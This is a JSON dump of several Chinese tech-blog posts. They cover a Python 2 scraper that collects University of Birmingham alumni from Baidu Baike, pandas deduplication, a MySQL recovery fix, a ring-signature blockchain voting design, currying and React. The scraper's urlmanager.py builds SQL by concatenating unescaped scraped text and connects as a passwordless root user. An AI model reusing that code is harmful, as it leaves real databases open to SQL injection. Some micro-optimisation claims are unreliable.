})(window)"}],"posts":[{"title":"“我是如何收集校友的”之数据去重","slug":"“我是如何收集校友的”之数据去重","date":"2017-10-27T15:35:52.000Z","updated":"2017-10-28T15:15:40.587Z","comments":true,"path":"2017/10/27/“我是如何收集校友的”之数据去重/","link":"","permalink":"http://www.yfgeek.com/2017/10/27/“我是如何收集校友的”之数据去重/","excerpt":"","text":"按照上文讲到，我们已经抓取到了所有与“伯明翰大学”相关的数据，我们接下来要做的就是做数据清洗工作。 我们当前进度：2 爬虫程序——抓取全百度百科与“伯明翰大学”相关的数据 数据去重——用pandas去掉抓取相同的URL或相同的名称 提取人名——利用HMM-Viterbi进行人名筛选与提取 下载器——下载所有数据库中数据清洗过的URL，并存入数据库 人物Ranking——按照一定的排名方式，对人物进行知名度排名 人物梗概——利用NLP相关库，对提取的人物进行自动化梗概 为什么要进行去重？还不是因为爬虫爬下来的结果有大量的重复的信息，在后期的人名筛选甚至下载来说，我们提前先搞定这个重复的问题，节省工作量。有人提出可以在人名过滤后再去重，我想未尝不是一个好点子，但是HMM-Viterbi算法的复杂度高，这样可能降低后期的效率，提前去重未尝不可。 如图下所示，有很多重复切无用的信息。 关于去重，很多人第一时间想到了布隆过滤器，但是试问，在仅有不到1000的数据量的数据需要用到吗？本文用pandas自带的去重函数drop_duplictad()去重。如果想了解布隆过滤器，我自己也练手写了一个简单的范例。 首先，将SQL数据库中所有数据作为DataFrame输入到pandas， 然后，对相同名字的内容进行去重， 然后，对相同URL的内容进行去重， 随后，重新建立索引， 最后，将内容输出到新的数据表first_filter上，完成今天的工作。 1234567891011121314151617181920212223242526272829# coding=utf-8# python version：2.7from jpype import *import pandas as pdfrom sqlalchemy import create_engineimport pymysqlreload(sys)sys.setdefaultencoding('utf-8')class Filter(object): def __init__(self): self.engine = create_engine('mysql+pymysql://root:@localhost:3306/uob?charset=utf8') def distinct(self): sql = \"SELECT * FROM list;\" allData = pd.read_sql(sql, con=self.engine) # 从抓取过来的数据库读入 allData.drop_duplicates('name', 'first', inplace=True) # 去除重复name allData.drop_duplicates('url', 'first', inplace=True) # 去除重复url allData.reset_index(drop=True, inplace=True) # index重新计数 print allData.tail() allData.to_sql('first_filter', self.engine, if_exists='replace', index=True, index_label='fid') # 输出到新的数据库表first_filter return allDataif __name__ == \"__main__\": obj_filter = Filter() obj_filter.distinct() 跑完后我们到数据库中看看 不错，数据量已经下降到了708个，去重工作完成，其实在这期间遇到了很多坑，很多问题，不一一阐述，均为python环境问题。 下集预告：“我是如何收集校友的”之利用基于HMM-Viterbi的HanLP进行人名提取","categories":[{"name":"Python","slug":"Python","permalink":"http://www.yfgeek.com/categories/Python/"}],"tags":[{"name":"数据","slug":"数据","permalink":"http://www.yfgeek.com/tags/数据/"}],"keywords":[{"name":"Python","slug":"Python","permalink":"http://www.yfgeek.com/categories/Python/"}]},{"title":"“我是如何收集校友的”之爬虫模块","slug":"我是如何收集校友的之爬虫","date":"2017-10-26T13:01:49.000Z","updated":"2017-10-27T15:31:53.011Z","comments":true,"path":"2017/10/26/我是如何收集校友的之爬虫/","link":"","permalink":"http://www.yfgeek.com/2017/10/26/我是如何收集校友的之爬虫/","excerpt":"","text":"打开伯明翰大学的百科，发现与某相邻学校相比，中国校友实在太少，可能是校友过于低调。于是萌生一个想法，写一个爬虫找出百度百科里所有与“伯明翰”大学有关的校友，然后自动汇总，生成人物梗概，按照知名度排序。 需求大概就是这样，也就是说，我们需要以下几个模块： 爬虫程序——抓取全百度百科与“伯明翰大学”相关的数据 数据去重——用pandas去掉抓取相同的URL或相同的名称 提取人名——利用HMM-Viterbi进行人名筛选与提取 下载器——下载所有数据库中数据清洗过的URL，并存入数据库 人物Ranking——按照一定的排名方式，对人物进行知名度排名 人物梗概——利用NLP相关库，对提取的人物进行自动化梗概 话不多说，现在开始进行爬虫部分。 爬虫部分分为两类：信息获取器、URL管理器 信息获取器自动抓取百度搜索结果内容，并将其存入URL管理器 首先建立数据库uob，并且建立一个表明为list的表用于存储百度百科基础数据 12345678SET NAMES utf8;CREATE TABLE `list` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(255) DEFAULT NULL, `url` varchar(255) DEFAULT NULL, `description` varchar(255) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8; spider.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#coding=utf-8#python version：2.7import urllibimport urllib2import timefrom bs4 import BeautifulSoup as BSfrom urlmanager import UrlManagerclass Spider(object): def __init__(self): self.urls = UrlManager() #url管理器 def baidusearch(self,word,page): baseUrl = 'http://www.baidu.com/s' data = &#123;'wd': word, 'pn': str(page - 1) + '0', 'tn': 'baidurt', 'ie': 'utf-8', 'bsst': '1'&#125; data = urllib.urlencode(data) url = baseUrl + '?' + data try: request = urllib2.Request(url) response = urllib2.urlopen(request) except urllib2.HttpError, e: print e.code exit(0) except urllib2.URLError, e: print e.reason exit(0) html = response.read() soup = BS(html, \"lxml\") td = soup.find_all(class_='f') for t in td: name = t.h3.a.get_text().replace(' ', '').replace(' ', '').replace('\\n', '').replace(u'_百度百科','') # print name url = t.h3.a['href'].replace(' ', '').replace('\\n', '') # print url font_str = t.find_all('font', attrs=&#123;'size': '-1'&#125;)[0].get_text() start = 0 # 起始 realtime = t.find_all('div', attrs=&#123;'class': 'realtime'&#125;) if realtime: realtime_str = realtime[0].get_text() start = len(realtime_str) # print realtime_str end = font_str.find('...') # print font_str[start:end+3],'\\n' self.urls.add_new_url(name, url, font_str[start:end+3].replace(' ', '').replace(' ', '').replace('\\n', ''))if __name__==\"__main__\": obj_spider = Spider() for x in range(1,200): obj_spider.baidusearch('伯明翰大学 site:baike.baidu.com', x) time.sleep(3) urlmanager.py 1234567891011121314151617181920212223242526272829#coding=utf-8#python version：2.7import pymysqlclass UrlManager(object): def __init__(self): self.new_urls = dict() # 待爬取url self.old_urls = dict() # 已爬取url self.db = pymysql.connect(\"localhost\", \"root\", \"\", \"uob\" ,use_unicode=True, charset=\"utf8\") self.cursor = self.db.cursor() def add_new_url(self, name, url, description): # 向管理器中添加一个新的url if url is None: return if url not in self.new_urls and url not in self.old_urls: self.new_urls[name] = url sql = u\"INSERT INTO list (name, url, description) VALUES (\\\"\" + name + u\"\\\", \\\"\" + url + u\"\\\", \\\"\" + description + u\"\\\");\" print sql try: # 执行sql语句 self.cursor.execute(sql) # 提交到数据库执行 self.db.commit() # print \"success\" except: # Rollback in case there is any error self.db.rollback() print \"error\" 将数据存入数据库，最后获取信息如下： 明日更新：“我是如何收集校友的”之数据去重","categories":[{"name":"Python","slug":"Python","permalink":"http://www.yfgeek.com/categories/Python/"}],"tags":[{"name":"数据","slug":"数据","permalink":"http://www.yfgeek.com/tags/数据/"}],"keywords":[{"name":"Python","slug":"Python","permalink":"http://www.yfgeek.com/categories/Python/"}]},{"title":"记一次MySQL无法启动及修复经历","slug":"记一次Mysql无法启动及修复经历","date":"2017-08-18T12:27:29.000Z","updated":"2017-10-26T12:59:55.527Z","comments":true,"path":"2017/08/18/记一次Mysql无法启动及修复经历/","link":"","permalink":"http://www.yfgeek.com/2017/08/18/记一次Mysql无法启动及修复经历/","excerpt":"","text":"记得有次本地的MySQL无法启动，网上说，去删掉InnoDB日志就行，我就傻乎乎的去删掉了InnoDB相关的文件，果然，没有任何问题，正常启动了。 可是谁曾想，过了几天，故障复现了，我就按部就班的又去删除，结果，又解决了。 可是，现在棘手的问题又出现了，数据库，彻底的挂掉了。 1234567[ERROR] InnoDB: Attempted to open a previously opened tablespace2017-08-18 20:07:04 140736493900736 [ERROR] InnoDB: Attempted to open a previously opened tablespace. Previous tablespace blockvotes/vote uses space ID: 7 at filepath: ./blockvotes/vote.ibd. Cannot open tablespace phpmyadmin/pma__pdf_pages which uses space ID: 7 at filepath: ./phpmyadmin/pma__pdf_pages.ibd2017-08-18 20:07:04 7fffc4b9d3c0 InnoDB: Operating system error number 2 in a file operation.InnoDB: The error means the system cannot find the path specified.InnoDB: If you are installing InnoDB, remember that you must createInnoDB: directories yourself, InnoDB does not create them.InnoDB: Error: could not open single-table tablespace file ./phpmyadmin/pma__pdf_pages.ibd 按照网上的说法，没救了，因为第一次删除了InnoDB的ibdata1文件，这个文件是共享表空间，是不可以随便乱删的。 可是想着我的数据库里还存着很多东西，不能就这样放弃。 终于，找到了强力解决方法！ 修复方法，打开my.cnf文件，把开启mysql的innodb强制修复属性 123[mysqld]innodb_force_recovery = 1 启动服务后，瞬间好了，数据完好无损，没有丢失。","categories":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/categories/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/tags/Web/"}],"keywords":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/categories/Web/"}]},{"title":"BlockVotes 一个基于区块链的环签名投票系统","slug":"blockvotes","date":"2017-08-09T17:10:41.000Z","updated":"2017-10-26T12:59:55.515Z","comments":true,"path":"2017/08/10/blockvotes/","link":"","permalink":"http://www.yfgeek.com/2017/08/10/blockvotes/","excerpt":"","text":"好久好久没有写Blog了，最近在忙我的论文，题目是一个基于区块链的环签名投票系统。 听着名字挺绕的，实际上也是挺绕的，我做这个题目实际上是将三个学术领域的东西放在了一起： 电子投票 (e-voting) 属于密码学 区块链(blockchain) 属于密码学的应用 环签名(ring-signature) 属于密码学 如果对以上三个概念无任何了解，基本上就告别理解我做的东西了。这个项目目前处于私有项目状态之中，由于存在毕业设计可能会代码查重的问题，在九月初，将会对本项目彻底开源。 理念 电子投票？实际上，这个学术命题属于电子投票方向的，在电子投票学术方向上属于创新型，在区块链上属于应用型，在谈及这些问题之前，得先说说学术上的电子投票的一些概念： 隐私性: 选票保密性 (BP): 任何攻击者都无法把用户所投的票和投票者的身份联系起来。 无收据性 (RF): 投票者在投票后不能证明他是怎么投票的。系统不允许投票者在投票后证明这些。 不可强制性 (CR): 任何攻击者都无法强制用户生成自己不想投的票据。 攻击者不会强迫选民得到相应的收据以供强迫者检查。 可验证性: 个体可验证性：每个投票者可以验证自己的投票是不是倍正确计入所有投票。 全局验证性：任何投票者都可以验证其他投票者所投票的合法性。 不可重投性: 不可重投性指的是，任何投票者无法对相同的消息进行两次投票。 公平性: 公平性指的是，任何人都无法提前知道选票的结果，以及无法影响选票的结果。 其实还有很多很多概念，具体可以参考引用中的第一个论文。 实际上，隐私性和可验证性在一定程度上是互相矛盾的，保障可验证性的情况下就可能无法保证隐私，我们在电子投票的方面的目标是尽可能的保障以上的目标。 所以，设计一个系统是从隐私性和可验证性的角度上出发的，这也就解释了，为什么用区块链，为什么用环签名。 为什么用区块链区块链是什么？区块链可以理解为“分布式公共账本”，按照计算机的角度上，如果你对区块链一窍不通，你可以理解为一个可 增加、查找 却不能修改、删除的 分布式实时数据库。而比特币中的交易信息就是存在这个数据库之中的。 如果你还是不理解，请千万不要到互联网上搜索什么是比特币、比特币挖矿原理、什么是区块链，只会让你更加疑惑，他们试图把区块链描述的非常高大上，迷惑你，并且告诉外人，这是很高大上的东西，其实不是，如果你真正研究过区块链的协议，你会觉得其实不是那么回事。在此，对于那些故作玄虚的文章，我想引用《LaTeX新人教程，30分钟从完全陌生到基本入门》文章所说的一句话表达我的心情： 我要严厉警告和强烈声讨那些自以为是advanced LaTeX user的人。请你们不要为了自己那一点可怜可悲的虚荣心，去刻意渲染LaTeX有多么高端多么不容易学习，这和孔乙己炫耀茴香豆的茴字有四种写法有什么区别么？混账！LaTeX到底有多“难”你们自己清楚好么？ 所以，我附了一篇论文[3]，不过是英文版的，但是都是纯白话口语讲述到底什么是区块链，比特币的挖矿原理，实际上是非常浅显易懂的。如果有时间，恰当的时候，我也可以翻译成中文。 世界上第一个区块链是比特币创造的，比特币需要区块链才能够叫做区块链，为什么？ 因为作为“货币“，最根本的存在的意义是什么？ 证明资产？自己是富二代？不不不，不是的。 根本意义实际上是交易，人类社会，有了交易，才有了货币，货币是一般等价物，这个我们在中学都学过。 那么作为一种货币，货币是要流通的，如果顾客买了商家的东西，是不是要顾客给商家付款呀？天经地义的。 这个过程就是交易，那么，如何证明顾客已经把钱付给了商家？ 在现实生活中，太简单了，根本不用证明，顾客直接把钱给商家就行了。 但是，如果顾客用银行卡或者支付宝呢？ 好！我们的概念来了，这个概念叫 账本。 什么是账本？实际上就是银行的这笔交易的流水，在你用银行卡划卡支付的过程中，实际上是顾客和商家都信任银行，认为银行记下来的这个账是正确无误的，并且银行也把顾客的钱减少了，把商家的钱增加了。那么这个记账的媒介，该笔账单，可以说是账本的一部分。 如果你的银行账户消费的内容足够多，那么这就是一个账本，上面记录着你的所有的交易信息，交易信息和你的账户余额的值一一对应，在这种情况下，你相信银行，你相信账本，银行作为第三方支付方式，你也就自然就信任了。 可是我为什么要提出账本的概念呢？ 区块链就是一个分布式的公共记账账本。凡是下载了比特币(或XX币，我这里用比特币举例)的客户端的人，都会自动下载这个账本，这个账本储存着全球所有人的通过比特币交易信息。这个信息只能增加，不可以删除、修改，否则就无法解决同步的问题。 那么我们就可以理解区块链，就是一个分布式的不可删改的数据库，现在理解了吧？ 回归正题，为什么要用区块链，因为区块链的广播机制是通过比特币进行交易而储存的，每个交易中都会有一个东西叫做附言(OP_RETURN)，在附言位置可以留自己的转账信息比如： 哈，这笔交易你收好！是小明转给你的 这个信息是随意的，可以写任何东西。 真实的例子 附言内容是 haha 那么聪明的人来了，这段信息是不是可以用来储存东西，虽然有容量限制，但是储存的东西就是永久的不会被更改的。 不错，我创建一个公共的计票的比特币的账户，并且公开地址，每个投票者对这个地址进行转账，并且附上自己的投票信息，比如候选人什么的作为附言，然后进行转账，内容就是相当于“发布到了区块链”上了。 区块链技术基于去中心化的对等网络，用开源软件把密码学原理、时序数据和共识机制相结合，来保障分布式数据库中各节点的连贯和持续，使信息能即时验证、可追溯、但难以篡改和无法屏蔽，从而创造了一套隐私、高效、安全的共享价值体系。 高判立下，这样每个投票者的投票信息就是公开的可以验证的，但是又由于比特币地址本身具有匿名性，谁也不知道发布投票信息的人是谁，这又符合了隐私性。 你看，是不是完美了？ 为什么用环签名不是，并不完美。 为什么？ 那在这种情况下，岂不是任何人都可以投票了，不经过投票中心认证的人，都可以瞎投，扰乱视听，而且投票者无法验证整体性。 没错，这个时候伟大的环签名来了。 在理解环签名之前，你需要对密码学的签名机制有所了解，如果不了解，请点击这里。 环签名，实际上是一种特殊的群签名。你不用理解什么是群签名，只需要听我继续往下讲什么是环签名。 你看，我附了一个山东大学一个优秀的博士论文截图，是不是瞬间就显得高大上？ 其实也没有什么的。 环签名是对一个特定的内容进行签名。 在签名之前，所有人围城一个环，每个人生成一个自己的私钥Si，并且告诉其他人自己的公钥(P1,P2,P3…Pn)。 接下来就是开始签名，每个人用自己的私钥Si和所有人的公钥(P1,P2,P3…Pn)对内容m进行签名，可以得到签名s。 注意： 每个人的得到的签名都是不一样的 签名的长度取决于公钥的个数 这样，我们把m替换为我们的投票内容，这样就可以在组织投票之前，对能够投票的人进行圈定，只有在这个圈子里的人才能投票。 环签名具有天然的可验证性，任何人都可以验证自己，只需要根据得到的签名和所有人的公钥就可以得出自己是不是真正的投票了。 如果把签名信息s也随着信息m一起广播到区块链上，那是不是就能够保障整体验证性与个体验证性？ 好了，我们投票的主要矛盾解决了！现在，真的解决了！ 你可能一句都没看懂我上面在说什么，也可能看懂了一点，没事，摸摸头，是我表达能力太差了，其实都是非常简单的东西。 具体投票协议我不告诉你哈哈哈哈哈哈，会在九月份公开。 都是一些数学表达，发了也得花大量篇幅去解释，费劲。 因为内容可能会查重，即使是中文版本现在我也不想发。 技术栈 后端语言：PHP 后端数据库：MySQL 区块链：比特币BTC/比特币测试网络TESTNET PHP MVC 框架：Slim PHP DAO 框架：Illuminate Database PHP 依赖管理： Composer PHP 模板引擎：TWIG 前端包管理：NPM 前端CSS预处理器：Sass 前端代码打包工具：Gulp 前端预编译器：browserify 版本控制：Git 说句实话，技术挺复杂的，用到了很多第三方类库、框架、工具，感谢很多第三方类库的帮助，在我写代码的时候，也发现了一个第三方类库的Bug，并随手修复了，也算是对开源社区的回馈吧。 关于开源项目会开源的，我知道，区块链最近创业很多，我的这个项目也可以用来创业，但是我根本不在乎这些金钱的东西，我更享受开源所带来的快感。 但是如果拿去用来做商业用途，我还是很不爽的，所以我的这个项目禁止用于商业用途，但是非营利用途都是可以的。 截图可能不是最终版，先尝鲜一下 本文参考文献[1] Jonker H, Mauw S, Pang J. Privacy and verifiability in voting systems: Methods, developments and trends[J]. Computer Science Review, 2013, 10:1-30. [2] 张江霄, 李舟军, 刘霞,等. 基于群盲签名的多授权电子投票系统[J]. 中国科技论文, 2015(8):980-983. [3] Mercer R. Privacy on the Blockchain: Unique Ring Signatures[J]. 2016.","categories":[{"name":"Blockchain","slug":"Blockchain","permalink":"http://www.yfgeek.com/categories/Blockchain/"}],"tags":[{"name":"Blockchain","slug":"Blockchain","permalink":"http://www.yfgeek.com/tags/Blockchain/"}],"keywords":[{"name":"Blockchain","slug":"Blockchain","permalink":"http://www.yfgeek.com/categories/Blockchain/"}]},{"title":"拍拍哒投资平台","slug":"ppd","date":"2017-06-25T17:05:25.000Z","updated":"2017-10-26T12:59:55.526Z","comments":true,"path":"2017/06/26/ppd/","link":"","permalink":"http://www.yfgeek.com/2017/06/26/ppd/","excerpt":"","text":"本文是近期状况的一些小记录，无技术探讨。 最近参加了一个小比赛，第二届魔镜杯数据应用大赛，大概就是做一个金融数据产品，用了两天码了一些代码，还是学习到了一些知识。 至少学到了怎么在前端获取标准的oAuth，其实很简单，事情实践起来总是好的。 至于开发语言方面，本来是想用python的，后来因为工期紧，就用Thinkphp改了改，事实上发现，之前做的任何事情都是有用的。 具体做了两个平台： 模拟平台——从已有的数据库读取数据，供用户学习 投资平台——获取真实数据，实时分析，真实交易 在这期间，做了这些工作： 完整的用户登录、注册逻辑 集成拍拍贷SDK到框架里，依赖RSA算法 可以通过拍拍贷的OAuth授权到用户上 不同用户可以储存不同的token信息 构建了一个API用于读取特定的信息，可以批量读取投资信息 构建了一个API用于读取单个的信息 真实的模拟投资系统，根据日期的变化，改变可选投资项 真实的投资功能 数据可视化 用缓存机制存储分析数据，高效快速 基于神经网络算法进行逾期率预测 截图","categories":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/categories/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/tags/Web/"}],"keywords":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/categories/Web/"}]},{"title":"揭秘utf8=✓背后的小秘密","slug":"utf8true","date":"2017-02-17T08:51:18.000Z","updated":"2017-10-26T12:59:55.526Z","comments":true,"path":"2017/02/17/utf8true/","link":"","permalink":"http://www.yfgeek.com/2017/02/17/utf8true/","excerpt":"","text":"你可能和我一样疑惑，为什么github等网站，在POST数据的时候，经常带有utf8=✓字符，显然这种方式看起来很难以接受，因为Unicode编码错误的话会导致很多问题，毕竟用户的浏览器是不一样的。 为什么不用utf8=true来代替呢？ 答案恰恰相反！ utf8=✓就是为了让浏览器在POST数据时强制使用utf-8的编码方式，进而在后端代码中无需考虑字符串编码转换问题，以免带来困扰。 在IE8，或者更早的IE浏览器里，在POST数据时，会尽可能的POST以Latin-1编码方式的字符串，这给后端带来了巨大的兼容性的困扰，但是你一旦在POST数据中包含了✓这样的Unicode字符，就会自动用uft8的编码方式发送字符串。 是不是很有用的小技巧呢？ 本文翻译自:Is the use of “utf8=✓” preferable to “utf8=true”?","categories":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/categories/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/tags/Web/"}],"keywords":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/categories/Web/"}]},{"title":"浅谈函数式编程柯里化","slug":"currying","date":"2017-02-11T10:27:57.000Z","updated":"2017-10-26T12:59:55.523Z","comments":true,"path":"2017/02/11/currying/","link":"","permalink":"http://www.yfgeek.com/2017/02/11/currying/","excerpt":"","text":"百度百科里对柯里化的定义是 在计算机科学中，柯里化（Currying）是把接受多个参数的函数变换成接受一个单一参数(最初函数的第一个参数)的函数，并且返回接受余下的参数且返回结果的新函数的技术。这个技术由 Christopher Strachey 以逻辑学家 Haskell Curry 命名的，尽管它是 Moses Schnfinkel 和 Gottlob Frege 发明的。 简直看不懂哦，Talk is Cheap，我们拿一个简单的haskell程序说明什么叫 自动柯里化两数相加，返回结果： 1fun add x y = x + y 这是一个典型的柯里化的版本，当我输入 (add 1) 2 时与add 1 2 的返回结果一模一样，都是3 12Prelude&gt; (add 1) 23 但是，换个角度上讲，我明明设置了两个“变量”，在haskell里却把它们的结果又封装成了一个函数，这就是haskell的强大特性：自动柯里化，haskell全部帮你自动处理了。 简单来说，柯里化指的是函数里只接收一个余下的参数，再调用原函数，返回出相应的结果。 而同样的，没有柯里化的普通版本却是这样的： 1fun add(x, y) = x + y 这个版本里，只能通过add(1,2)进行相加操作。 柯里化实际上是将高阶函数进行降阶处理，没理解？接着看~ JavaScript的柯里化JavaScript存在闭包的特性，能够很好的为我们将函数柯里化，但是很可惜JavaScript不支持自动柯里化，这意味着，我们要自己写柯里化的过程，不过还好，这能有效的让我们理解，到底什么是柯里化。 同样的，还是那个add的简单函数，用JavaScript实现如下： 1234567function add(x, y)&#123; if(y===undefined)&#123; return (z) =&gt; x + z; &#125;else&#123; return x+y; &#125;&#125; 测试一下！通过执行add(1)(2)，果然返回了3，是的，这是一个手动构造柯里化函数的过程。对于大多数函数，我们有通用的柯里化方法： 1234567function curry(func) &#123; var fixedArgs = [].slice.call(arguments,1); return function() &#123; args = fixedArgs.concat([].slice.call(arguments)) return func.apply(null, args); &#125;;&#125; 也就是说，对于add函数来说，我们用一个函数生成了另一个范围更小的函数，一层接一层的解决问题。这符合函数式编程的思想，就是我们更关注函数与函数之间的关系，而非状态本身，更在乎局部而非整体。 这个例子体现不出这种思想的精妙之处，那么我们再举一个例子🌰 如果，我们想让一个已知的数组每个值都做加1操作，传统的方法该怎么做？ 12let ar = [1,2,3];ar.map((x)=&gt; x+1); 对吧？那么我们下面可以用柯里化的思想把这个问题实现： 12const add = ar =&gt; ar.map(x =&gt; x + 1);add([1, 2, 3]); 首先我们在add里定义了一个函数，并且传入参数为ar，ar进行Array.prototype.map()操作，对每一个数进行遍历，并且返回这个数字+1后的值给ar，这看起来挺玄乎的，但确实可行，我们只关心局部，请试图把add当做数学里中的函数去思考理解，或许会好懂的多。可是这只是方便了我们理解，那么到底有什么好处呢？ 再举一个例子🌰 如果我们想写一个函数，用来对已知数组的已知量进行相加n的操作，怎么写？传统方法 12345let ar= [1,2,3];function addToArray(ar,n)&#123; return ar.map((x)=&gt; x+n)&#125;;console.log(addToArray(ar,1)); 但是，我们可以这样写： 123const add = a =&gt; b =&gt; a+b;const addToArray = (ar,n) =&gt; ar.map(add(n));addToArray([2,3],1) 结果都一样，其实过程是不一样的，你可能真的憋不住了，到底有什么用呢？ 柯里化的好处就像上面的例子一样，你能看出不同吗？对，第一个的实质是新写了一个函数，对数组进行map操作，而第二个则是在直接在map里进行add操作，这很通用，一旦你写了很多类似于add的函数，就会方便起来，可以让我们方便的在map,reduce,filter里调用。 能够进行延迟计算，就像add(1)(2)一样，1比2先传入，2就会被延迟计算，在特定的场景里，有一定的应用意义。 当你发现你要调用一个函数，并且调用参数都是一样的情况下，这个参数就可以被柯里化，以便更好的完成任务。 优雅的写法，允许你写出来的代码更干净、更有表达力。 虽然柯里化在日常应用不多，但仍然是一个不可不了解的好概念。 相关阅读 JavaScript柯里化 Currying and ES6 Arrow Functions 浅析 JavaScript 中的 函数 currying 柯里化 Currying - Part 6 of Functional Programming in JavaScript(需梯子)","categories":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/categories/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/tags/Web/"}],"keywords":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/categories/Web/"}]},{"title":"什么才是优秀的程序代码","slug":"awesome-code","date":"2017-02-08T09:35:13.000Z","updated":"2017-10-26T12:59:55.523Z","comments":true,"path":"2017/02/08/awesome-code/","link":"","permalink":"http://www.yfgeek.com/2017/02/08/awesome-code/","excerpt":"","text":"首先，我想说的是，我谈及的“优秀程序代码”，不是指“优秀程序”，也不是更易阅读的“代码”，恰恰相反，我可能想写的是更不易阅读的代码，这里的“优秀”指的是高效、快速。 在写之前，我想先用一个原则引入这个文章： KISS原则 *Keep It Simple, Stupid* 是的，这是我心中优秀的代码程序，就是简单、高效。 相信所有人都知道时间复杂度这个东西，是的，优秀的代码永远都在做一件事：降低时间复杂度，哪怕写的过程是复杂的、理解起来是相对难的(比如，快速排序、堆排序)。那么，我接下来，想较一下真。 卡常数 据考证，[卡]（Qa’a）是古埃及第一王朝的最后一位法老。 他发现并研究了一种常数，后世以他的名字叫做卡常数。卡特兰数的起源也是因为卡的后人与特兰克斯结婚，生下来的孩子就叫卡特兰，而他只是发表了祖传的家书而已。 Sereja也是卡的后人，提出括号序列问题，也是从家书里得到的资料。然而Sereja为了不让这个秘密公开，于是隐瞒了这道题的真正做法。可是由于卡的后人不是各个都像卡特兰一样爱慕虚荣，这一算法也无法找到。“欲见贤人而不以其道，犹欲其入而闭之门也”。卡之常数的奥秘，需要以一颗诚心去追寻。 看不懂对吗？ 我也看不懂，因为这是一群高中生写的。按照我的理解，卡常数，就是内循环里的那些看似不重要的语句其实每一句话的运行速度是不一样的，这个客观规律，是真实存在的，举个栗子🌰 程序1 123456for (int i = 0; i &lt;= K; i++) for (int j = 0; j &lt;= K; j++) for (int k = 0; k &lt;= K; k++) &#123; r.a[i][j] += a[i][k] * x.a[k][j]; if (r.a[i][j] &gt;= 1ll &lt;&lt; 62 || k == K) r.a[i][j] %= mod; &#125; 程序2 1234for (int i = 0; i &lt;= K; i++) for (int j = 0; j &lt;= K; j++) for (int k = 0; k &lt;= K; k++) r.a[i][j] = (r. a[i][j] + a[i][k] * x.a[k][j] % mod) % mod; 按照常人的理解，程序1和程序2的复杂度都是O(n^3)，没错，那么他们的时间是一样的吗？ 并不一样。 在机器性能并没有那么高的情况下，在测试数据量没有那么少的情况下，第二种比第一种快了一倍。 为什么？ 因为第二种代码更加精炼吗？并不完全是。 在程序1中，if (r.a[i][j] &gt;= 1ll &lt;&lt; 62 || k == K)实际上是耗费时间的，if操作在执行的时候真实的操作是这样的： 1234if(这里面是true吗？) 左边是true吗？ 右边是true吗？ ||操作是true吗？ 这必然会消耗大量的时间，同理 12r.a[i][j] += a[i][k] * x.a[k][j];r.a[i][j] = a[i][k] * x.a[k][j] + r.a[i][j]; 一样吗？实际上是不一样的，后者比前者快一点。 你可能觉得，这也太较真了吧？但是高效就是高效，效率提高才是硬道理。 不积跬步，无以至千里；不积小流，无以成江海。 原则 一杆内存在心中 多写一个不必要的循环递归，浑身难受 多写一个不必要的逻辑判断，浑身难受 多写一个无关变量，浑身难受 不找到最优解，浑身难受 始终自发的想着如何用栈、树去解决问题 代码效率哪怕提升的是一倍，花一天优化代码也是值得的 时刻遵循RP定律写代码，RP++ 我从我接触OI那一刻起，我觉得算法是美的，每一个人写出来的算法都体现了一种算法，永远对高效快速的低复杂度的精炼代码充满敬畏之心！❤️","categories":[{"name":"CodeStyle","slug":"CodeStyle","permalink":"http://www.yfgeek.com/categories/CodeStyle/"}],"tags":[{"name":"CodeStyle","slug":"CodeStyle","permalink":"http://www.yfgeek.com/tags/CodeStyle/"}],"keywords":[{"name":"CodeStyle","slug":"CodeStyle","permalink":"http://www.yfgeek.com/categories/CodeStyle/"}]},{"title":"我眼中的React","slug":"react","date":"2017-02-04T06:35:03.000Z","updated":"2017-10-26T12:59:55.525Z","comments":true,"path":"2017/02/04/react/","link":"","permalink":"http://www.yfgeek.com/2017/02/04/react/","excerpt":"","text":"前两天，用React把 之前的 基于树莓派3B,DHT11/DHT22,LCD1602的一个实时温度湿度检测系统 的Web部分重构了一下。 这个项目之前是用Semantic UI + eCharts + JQuery Datapicker写的，由于这个项目的实现过程比较经典，几乎把所有的感觉React的基础思想都实现了一遍。 无疑，React给前端带来了各种新的想法与思想，声明式、虚拟Dom、单向数据流、JSX、组件化、Flux、以JavaScript为中心、React Native。 虚拟DomReact是以JS为中心的，而非HTML，虚拟Dom是一个至关重要的概念。 在jQuery出现之前，我们一般都是直接操作Dom，方法“暴力、简单”，也存在兼容性的问题。在jQuery出现之后，jQuery的选择器帮助我们简单、高效的操作Dom，也就是在jQuery出现之后，前端就开始大爆发了。 但是随着发展，这种简单暴力的操作Dom的方法对于很多大型系统性工程来说，从软件工程的角度上讲，是杂乱、无序的，一旦时间久远，项目越来越大，维护成本就变大。于是，我们有了各种前端MVC、MVVM框架，典型的有Angular、React、vue.js，MVVM给我们带来一种全新的思想，数据绑定。 不过，与此同时，React给我们带来了一种全新的思想，虚拟Dom，从此，我们再也不用直接操作Dom了，而是用虚拟Dom更新Dom。 你可能会问，这样做，效率岂不是更低了？ 是的，也不是。其实没有那么明显，一般来讲，操作Dom树的Diff算法应该是O(n^3)，而React把效率降低到了O(n)。 简单来讲，如图所示，React只会比较相同层级的Dom，从而简化了Dom Diff的复杂度，虽然有所舍弃，但是全局比较是没有必要的。 通过在JSX文件中写虚拟Dom，React在内存中会自动拿现在的虚拟Dom和旧的虚拟Dom进行Diff操作，如果发现有Diff的部分，就拿出来形成新的Patch部分，加入到现在的Dom树上。 也就是因为这个原因，虚拟Dom使得在操作Dom上更加高效，每次更新数据不会进行O(n^3)复杂的操作。 你可能会问，什么是JSX？ JSX其实JSX只是一种未编译的JavaScript，可以方便的对HTML进行书写，先上代码： 